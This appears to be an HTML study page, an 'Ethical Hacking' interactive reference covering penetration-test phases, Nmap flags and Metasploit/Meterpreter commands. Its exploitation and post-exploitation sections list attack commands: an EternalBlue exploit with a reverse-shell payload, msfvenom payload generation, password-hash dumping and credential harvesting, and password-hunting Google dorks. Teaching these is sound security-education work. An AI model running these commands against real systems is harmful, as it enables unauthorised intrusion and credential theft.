@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ethical Hacking — Phase Explorer & Nmap Reference</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Courier New', Courier, monospace;
+    background: #0d1117;
+    color: #c9d1d9;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  h1 { color: #58a6ff; font-size: 1.4rem; margin-bottom: 4px; }
+  .subtitle { color: #8b949e; font-size: 0.85rem; margin-bottom: 24px; }
+  .tabs { display: flex; gap: 6px; margin-bottom: 20px; flex-wrap: wrap; }
+  .tab-btn {
+    background: #161b22;
+    border: 1px solid #30363d;
+    color: #8b949e;
+    padding: 8px 16px;
+    cursor: pointer;
+    border-radius: 6px;
+    font-family: inherit;
+    font-size: 0.85rem;
+    transition: all 0.2s;
+  }
+  .tab-btn:hover { border-color: #58a6ff; color: #58a6ff; }
+  .tab-btn.active { background: #1f6feb; border-color: #1f6feb; color: #fff; }
+  .panel { display: none; }
+  .panel.active { display: block; }
+
+  /* Phase explorer */
+  .phases { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 20px; }
+  .phase-btn {
+    background: #161b22;
+    border: 2px solid #30363d;
+    color: #8b949e;
+    padding: 10px 14px;
+    cursor: pointer;
+    border-radius: 8px;
+    font-family: inherit;
+    font-size: 0.8rem;
+    text-align: center;
+    min-width: 110px;
+    transition: all 0.2s;
+  }
+  .phase-btn .num { font-size: 1.2rem; color: #f78166; display: block; }
+  .phase-btn:hover { border-color: #58a6ff; }
+  .phase-btn.active { border-color: #3fb950; background: #0d2a1a; color: #3fb950; }
+  .phase-btn.active .num { color: #3fb950; }
+
+  .phase-detail {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 10px;
+    padding: 20px;
+    min-height: 260px;
+  }
+  .phase-detail h2 { color: #3fb950; margin-bottom: 8px; font-size: 1.1rem; }
+  .phase-detail p { color: #8b949e; font-size: 0.85rem; margin-bottom: 14px; line-height: 1.6; }
+  .tools-list { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 14px; }
+  .tool-tag {
+    background: #0d2a1a;
+    border: 1px solid #3fb950;
+    color: #3fb950;
+    padding: 3px 10px;
+    border-radius: 20px;
+    font-size: 0.78rem;
+  }
+  .cmd-block {
+    background: #0d1117;
+    border: 1px solid #30363d;
+    border-left: 3px solid #f78166;
+    border-radius: 4px;
+    padding: 12px;
+    font-size: 0.8rem;
+    white-space: pre;
+    overflow-x: auto;
+    color: #79c0ff;
+    line-height: 1.6;
+  }
+
+  /* Nmap reference */
+  .search-bar {
+    width: 100%;
+    background: #161b22;
+    border: 1px solid #30363d;
+    color: #c9d1d9;
+    padding: 10px 14px;
+    border-radius: 6px;
+    font-family: inherit;
+    font-size: 0.9rem;
+    margin-bottom: 16px;
+    outline: none;
+  }
+  .search-bar:focus { border-color: #58a6ff; }
+  .flag-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 10px; }
+  .flag-card {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 14px;
+    transition: border-color 0.2s;
+  }
+  .flag-card:hover { border-color: #58a6ff; }
+  .flag-card .flag { color: #79c0ff; font-size: 0.95rem; font-weight: bold; }
+  .flag-card .desc { color: #8b949e; font-size: 0.82rem; margin: 4px 0; }
+  .flag-card .example { color: #d2a8ff; font-size: 0.78rem; }
+  .category-label {
+    color: #f78166;
+    font-size: 0.75rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 4px;
+  }
+
+  /* Metasploit quick ref */
+  table { width: 100%; border-collapse: collapse; font-size: 0.83rem; }
+  th { background: #1f6feb; color: #fff; padding: 8px 12px; text-align: left; }
+  td { padding: 7px 12px; border-bottom: 1px solid #21262d; }
+  tr:hover td { background: #161b22; }
+  td:first-child { color: #79c0ff; }
+  .section-title { color: #f78166; font-size: 0.9rem; font-weight: bold; margin: 20px 0 10px; }
+</style>
+</head>
+<body>
+<h1>&#x1F5A5; Ethical Hacking — Interactive Reference</h1>
+<p class="subtitle">Phase Explorer · Nmap Flag Reference · Metasploit Quick Reference</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('phases')">Pen Test Phases</button>
+  <button class="tab-btn" onclick="showTab('nmap')">Nmap Flags</button>
+  <button class="tab-btn" onclick="showTab('metasploit')">Metasploit</button>
+</div>
+
+<!-- PHASES PANEL -->
+<div id="tab-phases" class="panel active">
+  <div class="phases">
+    <button class="phase-btn active" onclick="showPhase(0)"><span class="num">1</span>Recon</button>
+    <button class="phase-btn" onclick="showPhase(1)"><span class="num">2</span>Scanning</button>
+    <button class="phase-btn" onclick="showPhase(2)"><span class="num">3</span>Enumeration</button>
+    <button class="phase-btn" onclick="showPhase(3)"><span class="num">4</span>Exploitation</button>
+    <button class="phase-btn" onclick="showPhase(4)"><span class="num">5</span>Post-Exploit</button>
+    <button class="phase-btn" onclick="showPhase(5)"><span class="num">6</span>Reporting</button>
+  </div>
+  <div class="phase-detail" id="phase-detail"></div>
+</div>
+
+<!-- NMAP PANEL -->
+<div id="tab-nmap" class="panel">
+  <input class="search-bar" type="text" placeholder="Search flags or descriptions..." oninput="filterFlags(this.value)">
+  <div class="flag-grid" id="flag-grid"></div>
+</div>
+
+<!-- METASPLOIT PANEL -->
+<div id="tab-metasploit" class="panel">
+  <p class="section-title">Core Commands</p>
+  <table id="msf-table">
+    <thead><tr><th>Command</th><th>Description</th></tr></thead>
+    <tbody></tbody>
+  </table>
+  <p class="section-title">Meterpreter Commands</p>
+  <table id="mtr-table">
+    <thead><tr><th>Command</th><th>Description</th></tr></thead>
+    <tbody></tbody>
+  </table>
+</div>
+
+<script>
+const phases = [
+  {
+    name: "Reconnaissance",
+    goal: "Gather intelligence about the target without triggering alarms or touching production systems.",
+    tools: ["Shodan", "theHarvester", "Maltego", "Amass", "WHOIS", "Google Dorks"],
+    commands: `# Passive DNS enumeration
+amass enum -passive -d target.com
+
+# Email/subdomain harvesting
+theHarvester -d target.com -b google,linkedin -l 500
+
+# Shodan CLI search
+shodan search "org:Target Company" --fields ip_str,port,product
+
+# Google dorks
+site:target.com filetype:sql
+intitle:"index of" site:target.com
+"password" filetype:xlsx site:target.com`
+  },
+  {
+    name: "Scanning",
+    goal: "Map the attack surface by identifying open ports, services, and potential vulnerabilities.",
+    tools: ["Nmap", "Nessus", "OpenVAS", "Masscan", "Unicornscan"],
+    commands: `# Host discovery sweep
+nmap -sn 192.168.1.0/24
+
+# Full SYN scan with version detection
+nmap -sS -sV -p- -T4 target -oA scan_results
+
+# OS fingerprinting + scripts
+nmap -A target
+
+# Vulnerability scan via NSE
+nmap --script vuln target
+
+# Fast scan with masscan
+masscan -p1-65535 target --rate=1000`
+  },
+  {
+    name: "Enumeration",
+    goal: "Extract specific data from discovered services: users, shares, directories, SNMP info.",
+    tools: ["enum4linux", "smbclient", "gobuster", "ffuf", "snmpwalk", "ldapsearch"],
+    commands: `# SMB enumeration
+enum4linux -a target
+smbclient -L //target -N
+
+# HTTP directory brute-force
+gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/common.txt
+ffuf -w wordlist.txt -u http://target/FUZZ
+
+# SNMP enumeration
+snmpwalk -c public -v1 target
+
+# LDAP enumeration
+ldapsearch -x -H ldap://target -b "dc=target,dc=com"`
+  },
+  {
+    name: "Exploitation",
+    goal: "Leverage discovered vulnerabilities to gain initial access to target systems.",
+    tools: ["Metasploit", "msfvenom", "searchsploit", "Custom exploits"],
+    commands: `# Search for exploit in Metasploit
+msfconsole -q
+msf6 > search eternalblue
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit > set RHOSTS target
+msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit > set LHOST 10.0.0.1
+msf6 exploit > run
+
+# Generate standalone payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe`
+  },
+  {
+    name: "Post-Exploitation",
+    goal: "Escalate privileges, persist access, pivot to other hosts, and harvest credentials.",
+    tools: ["Meterpreter", "Mimikatz", "LinPEAS", "WinPEAS", "Impacket", "Incognito"],
+    commands: `# Privilege escalation
+meterpreter > getsystem
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+# Credential harvesting
+meterpreter > hashdump
+meterpreter > run post/windows/gather/credentials/credential_collector
+
+# Pivoting - route traffic through session
+msf6 > route add 10.10.10.0/24 1
+msf6 > use auxiliary/scanner/portscan/tcp
+
+# Linux SUID privesc
+find / -perm -4000 2>/dev/null
+sudo -l`
+  },
+  {
+    name: "Reporting",
+    goal: "Document all findings clearly for both executive leadership and technical remediation teams.",
+    tools: ["Dradis", "Serpico", "Markdown", "Word/PDF"],
+    commands: `# Report structure:
+1. Executive Summary
+   - Risk level (Critical/High/Medium/Low)
+   - Business impact statement
+   - Top 3 key findings
+
+2. Technical Findings (per vulnerability):
+   - Title & CVSS v3.1 score
+   - Description & root cause
+   - Evidence (screenshots + commands)
+   - Affected systems
+   - Remediation steps
+
+3. Risk Matrix (Likelihood x Impact)
+4. Appendix (raw tool output, nmap XML)
+
+# CVSS Score Severity:
+# 0.0       = None
+# 0.1-3.9   = Low
+# 4.0-6.9   = Medium
+# 7.0-8.9   = High
+# 9.0-10.0  = Critical`
+  }
+];
+
+const nmapFlags = [
+  { flag: "-sS", desc: "SYN (stealth) scan — does not complete TCP handshake", example: "nmap -sS target", cat: "Scan Type" },
+  { flag: "-sT", desc: "TCP connect scan — completes full handshake", example: "nmap -sT target", cat: "Scan Type" },
+  { flag: "-sU", desc: "UDP scan", example: "nmap -sU -p 53,161 target", cat: "Scan Type" },
+  { flag: "-sn", desc: "No port scan — host discovery / ping sweep only", example: "nmap -sn 192.168.1.0/24", cat: "Scan Type" },
+  { flag: "-sA", desc: "ACK scan — maps firewall rules", example: "nmap -sA target", cat: "Scan Type" },
+  { flag: "-sV", desc: "Detect service versions on open ports", example: "nmap -sV target", cat: "Detection" },
+  { flag: "-sC", desc: "Run default NSE scripts", example: "nmap -sC target", cat: "Detection" },
+  { flag: "-O", desc: "Enable OS fingerprinting", example: "nmap -O target", cat: "Detection" },
+  { flag: "-A", desc: "Aggressive: OS + version + scripts + traceroute", example: "nmap -A target", cat: "Detection" },
+  { flag: "-p-", desc: "Scan all 65535 ports", example: "nmap -p- target", cat: "Ports" },
+  { flag: "-p 80,443", desc: "Scan specific ports", example: "nmap -p 22,80,443,8080 target", cat: "Ports" },
+  { flag: "--top-ports 100", desc: "Scan top N most common ports", example: "nmap --top-ports 1000 target", cat: "Ports" },
+  { flag: "-T0 to -T5", desc: "Timing templates (0=slowest, 5=fastest)", example: "nmap -T4 target", cat: "Timing" },
+  { flag: "--min-rate", desc: "Send packets no slower than N per second", example: "nmap --min-rate 5000 target", cat: "Timing" },
+  { flag: "-oN file", desc: "Output in normal (human-readable) format", example: "nmap -oN results.txt target", cat: "Output" },
+  { flag: "-oX file", desc: "Output in XML format", example: "nmap -oX results.xml target", cat: "Output" },
+  { flag: "-oA base", desc: "Output in all formats (.nmap, .xml, .gnmap)", example: "nmap -oA scan target", cat: "Output" },
+  { flag: "--script <name>", desc: "Run specific NSE script(s)", example: "nmap --script smb-enum-users target", cat: "Scripts" },
+  { flag: "--script vuln", desc: "Run all vulnerability-category scripts", example: "nmap --script vuln target", cat: "Scripts" },
+  { flag: "--script-args", desc: "Pass arguments to NSE scripts", example: "nmap --script http-brute --script-args http-brute.path=/login target", cat: "Scripts" },
+];
+
+const msfCommands = [
+  ["search <term>", "Search modules by keyword, CVE, or platform"],
+  ["use <module>", "Load a module for use"],
+  ["show options", "Display required and optional settings"],
+  ["set <OPT> <val>", "Set a module option value"],
+  ["setg <OPT> <val>", "Set a global option (persists across modules)"],
+  ["run / exploit", "Execute the loaded module"],
+  ["exploit -j", "Run exploit as a background job"],
+  ["sessions -l", "List all open sessions"],
+  ["sessions -i <id>", "Interact with a specific session"],
+  ["background / bg", "Background the current session"],
+  ["jobs", "List background jobs"],
+  ["info", "Display detailed module information"],
+  ["check", "Check if target is vulnerable (if supported)"],
+];
+
+const mtrCommands = [
+  ["sysinfo", "Display system information (OS, hostname, arch)"],
+  ["getuid", "Show current user context"],
+  ["getpid", "Show current process ID"],
+  ["ps", "List running processes"],
+  ["migrate <pid>", "Migrate to another process"],
+  ["getsystem", "Attempt automated privilege escalation"],
+  ["hashdump", "Dump local account password hashes"],
+  ["upload src dst", "Upload file to target"],
+  ["download src dst", "Download file from target"],
+  ["shell", "Drop into interactive OS shell"],
+  ["execute -f cmd", "Execute a command on the target"],
+  ["run <post_module>", "Run a post-exploitation module"],
+  ["portfwd add -l 8080 -r target -p 80", "Set up port forwarding"],
+  ["route add <subnet> <sid>", "Add a pivot route through session"],
+];
+
+function showTab(name) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  event.target.classList.add('active');
+}
+
+function showPhase(idx) {
+  document.querySelectorAll('.phase-btn').forEach((b, i) => {
+    b.classList.toggle('active', i === idx);
+  });
+  const p = phases[idx];
+  document.getElementById('phase-detail').innerHTML = `
+    <h2>${idx + 1}. ${p.name}</h2>
+    <p>${p.goal}</p>
+    <div class="tools-list">${p.tools.map(t => `<span class="tool-tag">${t}</span>`).join('')}</div>
+    <div class="cmd-block">${p.commands}</div>
+  `;
+}
+
+function renderFlags(list) {
+  const grid = document.getElementById('flag-grid');
+  grid.innerHTML = list.map(f => `
+    <div class="flag-card">
+      <div class="category-label">${f.cat}</div>
+      <div class="flag">${f.flag}</div>
+      <div class="desc">${f.desc}</div>
+      <div class="example">${f.example}</div>
+    </div>
+  `).join('');
+}
+
+function filterFlags(q) {
+  const lq = q.toLowerCase();
+  renderFlags(lq ? nmapFlags.filter(f =>
+    f.flag.toLowerCase().includes(lq) ||
+    f.desc.toLowerCase().includes(lq) ||
+    f.cat.toLowerCase().includes(lq)
+  ) : nmapFlags);
+}
+
+function renderTable(id, rows) {
+  const tbody = document.querySelector(`#${id} tbody`);
+  tbody.innerHTML = rows.map(r => `<tr><td>${r[0]}</td><td>${r[1]}</td></tr>`).join('');
+}
+
+// Init
+showPhase(0);
+renderFlags(nmapFlags);
+renderTable('msf-table', msfCommands);
+renderTable('mtr-table', mtrCommands);
+</script>
+</body>
+</html>
